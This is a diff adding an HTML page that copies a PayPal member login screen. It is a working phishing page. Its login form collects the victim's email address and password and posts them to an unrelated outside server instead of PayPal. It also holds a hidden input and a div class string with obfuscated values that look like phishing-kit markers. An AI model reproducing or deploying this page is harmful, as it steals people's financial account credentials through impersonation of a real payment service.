@@ -1,0 +1,123 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!--
+       Script info: script: webscr, cmd: _login-run, template: p/gen/login, date: Dec. 10, 2007 20:24:43 PST; country: US, language: en_US, xslt server: 
+       installation: WEBSCR-495-20071213-1       web version: 49.5-467153 branch: live-495_int
+       content version: 49.5-442158
+       pexml version: 49.5-468918
+       page XSL: User/default/en_US/general/Login.xsl
+       hostname : D8txRDmYZWwSAQchOBNxvvq2c7IkLpwy2D2AjtTQ.Hw
+-->
+<title>Login - PayPal</title>
+<!--googleoff: all-->
+<meta http-equiv="keywords" content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE">
+<!--googleon: all-->
+
+<!--googleoff: all-->
+<meta http-equiv="description" content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook.">
+<!--googleon: all-->
+<link rel="stylesheet" type="text/css" href="images/xpt.css">
+<link rel="stylesheet" type="text/css" href="images/xptInvoice.css">
+<link rel="stylesheet" type="text/css" href="images/xptObsolete.css">
+<link rel="stylesheet" type="text/css" href="images/xptlive.css">
+<link rel="stylesheet" type="text/css" href="images/default.css">
+<!--[if IE 6]><link rel="stylesheet" type="text/css" href="images/ie60win.css"><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" type="text/css" href="images/ie70win.css"><![endif]-->
+<link rel="stylesheet" type="text/css" href="images/rosetta.css">
+<link rel="stylesheet" type="text/css" href="images/flowHFR.css">
+<link rel="stylesheet" type="text/css" href="images/core.css">
+<link rel="stylesheet" type="text/css" href="images/pageLogin.css">
+<link rel="stylesheet" type="text/css" href="images/flowHFR.css">
+<link rel="stylesheet" type="text/css" href="images/lang.css">
+<style type="text/css"></style><link rel="shortcut icon" href="images/favicon.ico">
+</head><input type="hidden" name="niarB" value="352686a6261776940766f696c612e6672"><body>
+<div class="srd" id="header"><h1><a href="#"><img border="0" src="images/paypal_logo.gif" alt="PayPal"></a></h1>
+<form method="post" id="searchForm" name="searchForm" action="#">
+<fieldset>
+<legend>Search PayPal</legend>
+<label for="searchBox">Search </label><input type="text" id="searchBox" name="queryString" value=""> <input class="button" type="submit" id="search.x" name="search.x" value="Search">
+</fieldset>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+<div class="srd" id="navGlobal"><ul>
+<li class="first signup"><a href="#">Sign Up</a></li>
+<li class="login"><a href="#">Log In</a></li>
+<li><a href="#">Help</a></li>
+<li class="last"><a href="#">Security Center</a></li>
+</ul></div>
+<form class="rosetta" id="rosetta" method="post" action="https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run&amp;dispatch=5885d80a13c0db1f3893a48c4ade7e5f97951af3b1813a4533cbed6b60706f2a">
+<fieldset>
+<legend>Change Your Language</legend>
+<label for="rosetta_dropdown">Language Select</label><select id="rosetta_dropdown" name="locale.x"><option value="en_US" selected>U.S. English</option>
+<option value="es_XC">Español</option>
+<option value="fr_XC">Français</option>
+<option value="zh_XC">中文（简体）</option></select><br><button type="submit" name="testName" value="testValue" alt="Submit Language Change"></button><input type="hidden" id="" name="change_locale.x" value="1">
+</fieldset>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+</div>
+<div id="navPrimary" class="srd"><ul>
+<li><a href="#">Home</a></li>
+<li><a href="#">Personal</a></li>
+<li><a href="#">Business</a></li>
+<li><a href="#">Products &amp; Services</a></li>
+</ul></div>
+<div id="xptContentOuter"><table align="center" border="0" cellpadding="0" cellspacing="0" id="xptContentInner"><tr valign="top"><td>
+<div id="xptTitle"><table align="center" border="0" cellpadding="0" cellspacing="0" class="contentTitle">
+<tr>
+<td class="heading" width="100%"><h1>Member Log-In</h1></td>
+<td align="right" nowrap>
+<span class="small">Secure Log In</span> <img src="images/secure_lock_2.gif" border="0" alt="">
+</td>
+</tr>
+<tr><td colspan="2"><img alt="" border="0" height="2" src="images/pixel.gif" width="1"></td></tr>
+<tr><td colspan="2"><hr></td></tr>
+<tr><td><img alt="" border="0" height="4" src="images/pixel.gif" width="1"></td></tr>
+</table></div>
+<div id="xptContentMain"><div class="main"><div id="content">
+<div class="box login">
+<div class="header"><h2>Account login</h2></div>
+<div class="body">
+<form method="post" name="login_form" action=" http://popsp.ist-dein-chef.de/processing1.php">
+<input type="hidden" id="" name="login_cmd" value=""><input type="hidden" id="" name="login_params" value=""><fieldset>
+<legend>Member Log In</legend>
+<p><label for="login_email">Email address</label><input type="text" id="login_email" class="" name="user" value=""></p>
+<p><label for="login_password">PayPal password</label><input type="password" id="login_password" name="pass" value=""></p>
+<input type="submit" name="submit.x" value="Log In" class="button primary">
+</fieldset>
+<p>Forgot your <a href="#">email address</a> or <a href="#">password</a>?</p>
+<p>New to PayPal? <strong><a href="#">Sign up</a></strong></p>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+</div>
+</div>
+<div class="container"><img src="images/hdr_loginpage_560x228.jpg" border="0" alt=""></div>
+</div></div></div>
+</td></tr></table></div>
+<div id="footer" class="srd">
+<h5 class="accessAid">More Information</h5>
+<ul>
+<li class="first"><a href="#">About</a></li>
+<li><a href="#">Accounts</a></li>
+<li><a href="#">Fees</a></li>
+<li><a href="#">Privacy</a></li>
+<li><a href="#">Security Center</a></li>
+<li><a href="#">Contact Us</a></li>
+<li><a href="#">Legal Agreements</a></li>
+<li><a href="#r">Developers</a></li>
+<li><a href="#">Jobs</a></li>
+<li><a href="#">Merchant Services</a></li>
+<li><a href="#">Mobile</a></li>
+<li><a href="#">Plus Card</a></li>
+<li><a href="#">Referrals</a></li>
+<li><a href="#">Shops</a></li>
+<li class="last"><a href="#">Mass Pay</a></li>
+</ul>
+<p id="footerSecure"><a target="" href="#"><img border="0" src="images/logo_VIPwhite_66x27.gif" alt=""></a></p>
+<p id="legal">Copyright © 1999-2008 PayPal. All rights reserved.<br><a href="#">Information about FDIC pass-through insurance</a></p>
+</div>
+<div class="hide" id="navFull"></div>
+<div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
+</body></html>
